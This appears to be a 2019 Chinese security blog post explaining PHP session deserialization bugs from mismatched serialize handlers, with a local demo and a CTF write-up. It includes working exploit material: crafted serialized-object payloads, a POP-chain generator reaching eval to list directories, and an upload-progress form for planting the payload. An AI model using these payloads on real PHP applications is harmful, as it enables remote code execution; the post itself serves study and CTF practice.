@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>session 反序列化 | chuddy&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="chuddy's Blog">
+  
+  <meta name="description" content="session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下 简介在php.ini中存在几项配置项： 1234session.save_path=&amp;quot;&amp;quot;   --设置session的存储路径session.save_handler=&amp;quot;&amp;quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制">
+<meta name="keywords" content="web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="session 反序列化">
+<meta property="og:url" content="http://yoursite.com/2019/05/14/session-反序列化/index.html">
+<meta property="og:site_name" content="chuddy&#39;s Blog">
+<meta property="og:description" content="session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下 简介在php.ini中存在几项配置项： 1234session.save_path=&amp;quot;&amp;quot;   --设置session的存储路径session.save_handler=&amp;quot;&amp;quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/16/Eba1i9.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/16/EbBRcn.md.png">
+<meta property="og:updated_time" content="2019-05-16T12:25:10.391Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="session 反序列化">
+<meta name="twitter:description" content="session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下 简介在php.ini中存在几项配置项： 1234session.save_path=&amp;quot;&amp;quot;   --设置session的存储路径session.save_handler=&amp;quot;&amp;quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/05/16/Eba1i9.md.png">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">一个专注 WEB 安全的技术博客</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        一个专注 WEB 安全的技术博客
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="chuddy" target="_blank" href="//chuddyli.github.io">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="//github.com/chuddyli">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-session-反序列化" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      session 反序列化
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-05-14
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <h1 id="session-反序列化"><a href="#session-反序列化" class="headerlink" title="session-反序列化"></a>session-反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在<code>php.ini</code>中存在几项配置项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot;   --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>
+<p>以上的选项就是与PHP中的Session存储和序列话存储有关的选项。</p>
+<p>在使用xampp组件安装中，上述的配置项的设置如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;D:\xampp\tmp&quot;	表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line">session.save_handler=files		  	表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start=0				表明默认不启动session</span><br><span class="line">session.serialize_handler=php	   	表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure>
+<p>在上述的配置中，<code>session.serialize_handler</code>是用来设置<code>session</code>的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的<code>session</code>的存储方式不相同。</p>
+<ul>
+<li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
+<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
+<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
+</ul>
+<p>默认引擎为<code>PHP</code>引擎, 可以添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p>
+<h2 id="session-存储机制"><a href="#session-存储机制" class="headerlink" title="session 存储机制"></a>session 存储机制</h2><p>php中的session的内容并不是放在内存中的，二十以文件的方式来存储的，存储方式就是有配置项<code>session.sace_handler</code>来进行确定的,默认是以文件的方式存储。</p>
+<p>存储文件都是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列化之后的内容</p>
+<p>不同版本的引擎  保存的文件也不同<br>同样存储<code>$_SESSION[&#39;chuddy&#39;]=、&quot;chuddy123&quot;;</code>这样的一个session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">a:1:&#123;s:6:&quot;chuddy&quot;;s:9:&quot;chuddy123&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">chuddy|s:9:&quot;chuddy123&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_binary&apos;);</span><br><span class="line">chuddys:9:&quot;chuddy123&quot;;</span><br><span class="line">由于`chuddy`的长度是6，6在ASCII表中对应的就是&lt;0x06&gt;。</span><br><span class="line"></span><br><span class="line">根据php_binary的存储规则，最后就是chuddys:9:&quot;chuddy123&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="PHP-Session中的序列化的危害"><a href="#PHP-Session中的序列化的危害" class="headerlink" title="PHP Session中的序列化的危害"></a>PHP Session中的序列化的危害</h2><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。</p>
+<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;chuddy&apos;] = &apos;|O:11:&quot;chuddyClass&quot;:0:&#123;&#125;&apos;;</span><br></pre></td></tr></table></figure>
+<p>上述的$_SESSION数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;|O:11:&quot;chuddyClass&quot;:0:{}&quot;;}</code>。</p>
+<p>但是当我们进行读取的时候，选择的是<code>php</code>，那么最后读取的内容就会发生改变的<br>当使用<code>php</code>引擎的时候，<code>php</code>引擎会以<code>|</code>作为<code>key</code>和<code>value</code>的分隔符，那么就会将<code>a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;</code>作为SESSION的key值，将<code>O:11:&quot;chuddyClass&quot;:0:{}&quot;;}</code>作为SESSION的value值，然后进行反序列化，最后会得到<code>chuddyClass</code>这个类</p>
+<p>这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>存在session1.php和session2.php着这两个文件</p>
+<p>session1.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo @$_GET[&apos;chuddy&apos;];</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;chuddy&apos;] = @$_GET[&apos;chuddy&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>session2.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"></span><br><span class="line">class chuddy&#123;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		echo phpinfo();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当访问session1.php时 提交一下数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session1.php?chuddy=|O:6:%22chuddy%22:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>此时传入的数据会按照<code>php_serialize</code>来进行序列化存储</p>
+<p>然后去访问session2.php,页面会输出<code>phpinfo()</code>函数，说明成功执行了我们构造的函数。</p>
+<p>是因为在访问session2.php时，程序会按照php引擎来解析，SESSION中的数据，此时就会反序列化伪造的数据，就会实例化一个<code>chuddy</code>对象，最后就会执行析构函数中的<code>phpinfo()</code></p>
+<h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><p>安恒月赛的一道  反序列化题目：</p>
+<p>环境配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php版本&gt;5.5.4</span><br><span class="line"></span><br><span class="line">#php.ini部分相关配置</span><br><span class="line">session.auto_start=Off</span><br><span class="line">session.serialize_handler=php_serialize</span><br><span class="line">session.upload_progress.cleanup=Off</span><br><span class="line">session.upload_progress.enabled=On</span><br></pre></td></tr></table></figure></p>
+<p>主要给出了几个文件的源码：</p>
+<p>class.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename($_SERVER[&apos;PHP_SELF&apos;])));</span><br><span class="line">//show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">class foo1&#123;</span><br><span class="line">        public $varr;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;varr = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                if(file_exists($this-&gt;varr))&#123;</span><br><span class="line">                        echo &quot;&lt;br&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                echo &quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class foo2&#123;</span><br><span class="line">        public $varr;</span><br><span class="line">        public $obj;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;varr = &apos;1234567890&apos;;</span><br><span class="line">                $this-&gt;obj = null;</span><br><span class="line">        &#125;</span><br><span class="line">        function __toString()&#123;</span><br><span class="line">                $this-&gt;obj-&gt;execute();</span><br><span class="line">                return $this-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">        function __desctuct()&#123;</span><br><span class="line">                echo &quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class foo3&#123;</span><br><span class="line">        public $varr;</span><br><span class="line">        function execute()&#123;</span><br><span class="line">                eval($this-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">        function __desctuct()&#123;</span><br><span class="line">                echo &quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line"></span><br><span class="line">require(&quot;./class.php&quot;);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$obj = new foo1();</span><br><span class="line"></span><br><span class="line">$obj-&gt;varr = &quot;phpinfo.php&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>phpinfo.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    require(&quot;./class.php&quot;);</span><br><span class="line"> </span><br><span class="line">    $f3 = new foo3();</span><br><span class="line">    $f3-&gt;varr = &quot;phpinfo();&quot;;</span><br><span class="line">    $f3-&gt;execute();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>通过代码 发现了危险函数<code>eval</code> 可以想到利用php session 反序列化来进行构造自己想要的</p>
+<p>访问phpinfo.php 发现<br>[<img src="https://s2.ax1x.com/2019/05/16/Eba1i9.md.png" alt="Eba1i9.md.png">]<br>可以看到一些敏感的配置信息，也找到一下比较有用的信息</p>
+<p><code>session.upload_progress.enabled</code>，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。</p>
+<p>当一个上传在处理中，同时POST一个与php.ini中设置的<code>session.upload_progress.name</code>同名变量时，上传进度就可以在$_SESSION中获得。</p>
+<p>当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:19:&quot;upload_progress_123&quot;;a:5:&#123;s:10:&quot;start_time&quot;;i:1558005301;s:14:&quot;content_length&quot;;i:471;s:15:&quot;bytes_processed&quot;;i:471;s:4:&quot;done&quot;;b:1;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:139:&quot;|O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>测试一下 构造一个可以实现我们想要的功能的<br>本地测试的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class foo3&#123;</span><br><span class="line">        public $varr=&apos;var_dump(scandir(&quot;./&quot;));&apos;;</span><br><span class="line">        function execute()&#123;</span><br><span class="line">                eval($this-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class foo2&#123;</span><br><span class="line">        public $varr;</span><br><span class="line">        public $obj;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;varr = &apos;1234567890&apos;;</span><br><span class="line">                $this-&gt;obj = new foo3();</span><br><span class="line">        &#125;</span><br><span class="line">        function __toString()&#123;</span><br><span class="line">                $this-&gt;obj-&gt;execute();</span><br><span class="line">                return $this-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class foo1&#123;</span><br><span class="line">        public $varr;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;varr = new foo2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$obj = new foo1();</span><br><span class="line">print_r(serialize($obj));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在foo1中的构造函数中定义varr的值为foo2的实例，在foo2中定义obj为foo3的实例，在foo3中定义$varr的值var_dump(scandir(‘./‘));</p>
+<p>输出了序列化后的类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后通过上面讲的将这个类存入session文件中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">	    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	    &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后抓包修改相应的内容：</p>
+<p>[<img src="https://s2.ax1x.com/2019/05/16/EbBRcn.md.png" alt="EbBRcn.md.png">]</p>
+<p>然后修改相应的参数 就可以找到 flag文件  并读取出来；这就不一一细说了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己还是特别菜  好多还不会  </p>
+<p>希望能够静下心来 好好学</p>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年05月16日 20:25</p>
+        <p>原始链接： <a class="post-url" href="/2019/05/14/session-反序列化/" title="session 反序列化">http://yoursite.com/2019/05/14/session-反序列化/</a></p>
+        <footer>
+            <a href="http://yoursite.com">
+                <img src="/images/logo.png" alt="chuddy">
+                chuddy
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/05/14/session-反序列化/&title=《session 反序列化》 — chuddy's Blog&pic=http://yoursite.comimages/logo.png" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/05/14/session-反序列化/&title=《session 反序列化》 — chuddy's Blog&source=" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/05/14/session-反序列化/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《session 反序列化》 — chuddy's Blog&url=http://yoursite.com/2019/05/14/session-反序列化/&via=http://yoursite.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/05/14/session-反序列化/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/05/14/session-反序列化/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/web漏洞/" class="color1">web漏洞</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#session-反序列化"><span class="post-toc-text">session-反序列化</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简介"><span class="post-toc-text">简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#session-存储机制"><span class="post-toc-text">session 存储机制</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP-Session中的序列化的危害"><span class="post-toc-text">PHP Session中的序列化的危害</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实际利用"><span class="post-toc-text">实际利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CTF例题"><span class="post-toc-text">CTF例题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-text">总结</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/05/02/sql注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">sql注入</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 chuddy<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "http://yoursite.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/web/">web</a><a class="category-link" href="/categories/writeup/">writeup</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
